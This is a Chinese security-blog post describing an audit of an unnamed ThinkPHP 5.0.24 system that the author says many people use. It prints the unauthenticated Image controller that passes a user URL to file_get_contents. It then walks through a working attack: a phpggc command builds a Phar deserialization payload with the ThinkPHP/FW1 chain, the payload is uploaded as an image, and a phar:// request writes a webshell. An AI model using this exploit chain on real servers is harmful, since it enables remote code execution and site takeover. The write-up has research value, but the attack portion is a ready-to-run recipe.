#  【代码审计】记某次项目前台反序列化RCE漏洞研究   
原创 Mstir  星悦安全   2025-04-18 06:08  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字  
关注我们 并设为  
星标  
## 0x01 过程  
  
一套涉Zha的系统，名字就不给出了，貌似用的人还挺多.  
  
该项目框架:ThinkPHP 5.0.24 Debug:True  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6icDjWUFZQK4mToqE5Q4wE9nUZDr1NkPdCIIQ6FgB4cwKHd8eYZZIalVibHFUDyeCP13LaxeY2g1g/640?wx_fmt=png&from=appmsg "")  
  
翻遍了所有代码，上传点都限制的比较死，只能传白名单里的后缀，SQL注入也基本没有，只能去找找别的地方.  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6icDjWUFZQK4mToqE5Q4wEZWoXD8OibszibKf3gIQEmhJ3J50XHupQwmeKVl7Aux6WCozvPz2T2pmw/640?wx_fmt=png&from=appmsg "")  
  
这时候看到位于 /application/api/controller/Image.php 控制器中的Image 方法存在file_get_contesnts函数，这不就来了么.  
  
```
<?phpnamespace app\api\controller;use app\common\controller\Api as CommonController;final class Image extends CommonController{    protected $noNeedLogin = '*';    protected $noNeedRight = '*';    public function _initialize()    {        parent::_initialize();    }    public function image()    {        $imageData = file_get_contents(input('url'));        $image = imagecreatefromstring($imageData);        header("Content-Type: image/jpeg");        imagejpeg($image);        imagedestroy($image);        exit;    }}
```  
  
  
众所周知，file_get_contents 文件不仅能读取文件，在ThinkPHP 5.0.24 中是可以触发Phar反序列化漏洞的.  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5f6icDjWUFZQK4mToqE5Q4wEMW8orZvVA85VniaBvPeE36OUXsLZSa6BdeGmkN3pzKqxmzZJ2pE8DSw/640?wx_fmt=other&from=appmsg "")  
  
**首先需要用phpggc 生成一个Phar反序列化包，用ThinkPHP/FW1 这个利用链，注意需要绝对路径打对，然后本地放一个aaa.php 这里是你要写入的内容 (phpggc 可能会出点问题，把出问题的利用链文件直接删除即可).**  
  
****  
```
php.exe phpggc -p phar -o aaa.phar ThinkPHP/FW1 /www/wwwroot/xxxxx.com/public/ aaa.php
```  
  
  
![image.png](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5f6icDjWUFZQK4mToqE5Q4wEonk44mRGP93dkv5KK2AkUYKETE5soxDGpgoibv5kmeGYLPuxWOmrZZg/640?wx_fmt=other&from=appmsg "")  
  
**这里上传点颇多，随便找个点传上去即可.**  
  
****  
**然后访问直接 /api/image/image?url=phar://./upload/图片地址.png 即可直接调用该利用链写入SHELL到其目录下**  
  
****  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6icDjWUFZQK4mToqE5Q4wEwcFDUbsCnUmLt3ucXCq8Cld43Rr3JXIQWuk6AlOpNpPMDOjhhYBAaw/640?wx_fmt=png&from=appmsg "")  
  
**http://192.168.200.128/3b58a9545013e88c7186db11bb158c44.php**  
  
****  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5f6icDjWUFZQK4mToqE5Q4wEC15l3mhFHibyDEp3CRS5JgqzZRKiba4PaMN4r2sTuicR42Dducmbd3GxQ/640?wx_fmt=png&from=appmsg "")  
## 0x02 phpggc下载  
  
  
**标签:代码审计，0day，渗透测试，系统，通用，转转，Deepseek，AI**  
  
**phpggc关注公众号，发送 250418 获取!**  
  
****  
  
  
**免责声明:文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
